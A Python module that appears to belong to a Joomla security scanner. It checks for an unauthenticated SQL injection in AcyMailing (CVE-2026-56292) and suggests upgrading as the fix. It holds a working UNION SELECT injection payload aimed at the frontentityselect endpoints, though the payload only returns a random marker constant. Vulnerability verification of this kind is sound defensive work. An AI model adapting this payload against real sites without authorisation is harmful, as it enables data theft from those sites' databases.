from __future__ import annotations

import json
import urllib.parse
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.probes import rand_str
from .acymailing_advisory import acymailing_finding, metadata_base

CVE_ID = "CVE-2026-56292"
NAME = "AcyMailing unauthenticated SQL injection"
AFFECTED_RULE = "AcyMailing 1.0 through 10.11.0; fixed in 10.11.1"


def _contains_element_id(body: str, expected: str) -> bool:
    try:
        data = json.loads(body)
    except (TypeError, ValueError):
        return False

    def walk(value: Any) -> bool:
        if isinstance(value, dict):
            if str(value.get("id", "")) == expected:
                return True
            return any(walk(item) for item in value.values())
        if isinstance(value, list):
            return any(walk(item) for item in value)
        return False

    return walk(data)


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
    client = HttpClient(normalize_url(target_url), timeout=timeout, proxy=proxy)
    marker = f"proofcms_{rand_str(12)}"
    endpoints = (
        "/index.php?option=com_acym&ctrl=frontentityselect&task=loadEntityFront",
        "/index.php?option=com_acymailing&ctrl=frontentityselect&task=loadEntityFront",
    )
    attempts = []
    for endpoint in endpoints:
        common = {"entity": "user", "offset": "0", "perCalls": "1"}
        control_url = f"{endpoint}&{urllib.parse.urlencode({**common, 'columns': 'id'})}"
        payload = f"id FROM #__acym_user AS user UNION SELECT '{marker}'#"
        proof_url = f"{endpoint}&{urllib.parse.urlencode({**common, 'columns': payload})}"
        control = client.get(control_url, timeout=timeout)
        proof = client.get(proof_url, timeout=timeout)
        proof_body = proof.get("body", "")
        blocked = "not secured" in proof_body.lower() or "acym_access_denied" in proof_body.lower()
        confirmed = (
            proof.get("status") == 200
            and not proof.get("redirected")
            and _contains_element_id(proof_body, marker)
            and marker not in control.get("body", "")
        )
        attempts.append(
            {
                "endpoint": endpoint,
                "control_status": control.get("status", 0),
                "proof_status": proof.get("status", 0),
                "blocked": blocked,
                "confirmed": confirmed,
            }
        )
        if confirmed or blocked:
            return {
                "confirmed": confirmed,
                "blocked": blocked,
                "proof_url": proof_url,
                "attempts": attempts,
            }
    return {"confirmed": False, "blocked": False, "proof_url": None, "attempts": attempts}


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict | None = None,
    **kwargs: Any,
):
    finding = acymailing_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        fixed_version="10.11.1",
        plugins=plugins,
        enterprise_only=False,
        remediation="Upgrade AcyMailing to 10.11.1 or newer and review access logs for suspicious frontend queries.",
    )
    finding.exploit_available = True
    if not run_exploit_check or finding.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return finding
    if exploit_mode != "safe":
        finding.detail += " This module supports safe constant-only SQL injection verification."
        return finding
    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    finding.exploit_ran = True
    finding.evidence = {**(finding.evidence or {}), **proof}
    if proof["confirmed"]:
        finding.status = "VULNERABLE"
        finding.confidence = "CONFIRMED"
        finding.proof_url = proof["proof_url"]
        finding.detail = (
            "A random constant injected through the AcyMailing columns parameter was returned as an element id; "
            "the normal-column control did not contain it. No database contents were requested."
        )
    elif proof["blocked"]:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "HIGH"
        finding.detail = "The endpoint rejected the crafted column with AcyMailing's secured-column response."
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = "The constant-only SQL injection differential did not return the unique proof marker."
    return finding


def metadata() -> dict[str, Any]:
    data = metadata_base(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        enterprise_only=False,
        references=[
            "https://www.cve.org/CVERecord?id=CVE-2026-56292",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-56292",
        ],
    )
    data.update({"exploit_available": True, "exploit_modes": ["safe"], "module_version": "1.1.0"})
    return data
